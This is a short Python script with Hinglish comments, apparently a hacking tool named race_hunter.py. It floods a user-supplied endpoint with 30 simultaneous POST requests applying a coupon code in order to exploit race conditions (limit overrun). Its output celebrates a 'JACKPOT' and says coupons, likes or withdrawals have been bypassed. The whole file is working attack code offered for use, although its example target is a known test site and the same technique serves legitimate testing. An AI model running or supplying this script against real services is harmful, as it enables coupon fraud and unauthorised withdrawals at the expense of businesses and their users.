import requests
import concurrent.futures
import sys
import time

def send_request(target_url, req_id):
    # Ek simple POST request, jaise coupon apply karna ya money transfer karna
    data = {"action": "apply_coupon", "coupon_code": "HACKER_FREE_100"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Arch Linux x86_64)"}
    
    try:
        # Timeout chota rakha hai taaki script faste chale
        response = requests.post(target_url, data=data, headers=headers, timeout=5)
        return req_id, response.status_code, len(response.text)
    except requests.exceptions.RequestException:
        return req_id, "FAILED", 0

def race_condition_attack(target_url, threads=30):
    print(f"\n[*] Bhai, starting Race Condition (Limit Overrun) Attack on: {target_url}")
    print(f"[*] Preparing {threads} simultaneous threads to manipulate server time...\n")
    print("--------------------------------------------------")
    
    print("[*] 3... 2... 1... FIRING ALL REQUESTS AT THE EXACT SAME MILLISECOND! 💥\n")
    
    start_time = time.time()
    
    results = []
    
    # THE HACKER'S MULTI-THREADING LOGIC
    # ThreadPoolExecutor humari 30 requests ko ek hi nanosecond mein launch karega
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        # List comprehension se saare threads ek sath queue mein daal diye
        futures = [executor.submit(send_request, target_url, i) for i in range(threads)]
        
        # Jaise-jaise responses aayenge, hum unko record karenge
        for future in concurrent.futures.as_completed(futures):
            results.append(future.result())

    end_time = time.time()
    
    # Analysis Phase
    successful_requests = 0
    failed_requests = 0
    unique_responses = set()

    for req_id, status, length in results:
        if status == 200:
            successful_requests += 1
            unique_responses.add(length) # Response length alag hone ka matlab server alag react kar raha hai
        else:
            failed_requests += 1

    print("--------------------------------------------------")
    print(f"[*] Attack completed in {round(end_time - start_time, 2)} seconds!")
    print(f"[*] Total Requests Sent: {threads}")
    print(f"[*] Successful HTTP 200 OK: {successful_requests}")
    
    # THE BUG DETECTION LOGIC
    # Agar multiple requests successfully execute ho gayi ek hi action ke liye, toh Race Condition ho sakti hai
    if successful_requests > 1:
        print("\n   [!!!] JACKPOT 🎯 RACE CONDITION LIKELY FOUND!")
        print(f"   [!!!] The server accepted {successful_requests} simultaneous actions!")
        print("   [!!!] If this was a 'Like' button, 'Coupon', or 'Withdrawal', you just bypassed the limit.")
        
        if len(unique_responses) > 1:
             print("   [!] Note: Response lengths varied. Server might have processed some differently. Needs manual verification.")
    else:
        print("\n[-] Server handled the requests securely. It probably has proper database locking (Mutex).")

    print("\n[+] Race Condition Scan Complete, Bhai!")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 race_hunter.py <target_endpoint_url>")
        print("Example: python3 race_hunter.py http://testphp.vulnweb.com/login.php")
        sys.exit(1)
        
    target = sys.argv[1]
    # Tum threads bada sakte ho (e.g., 50 ya 100) par test server hang ho sakta hai!
    race_condition_attack(target, threads=30)
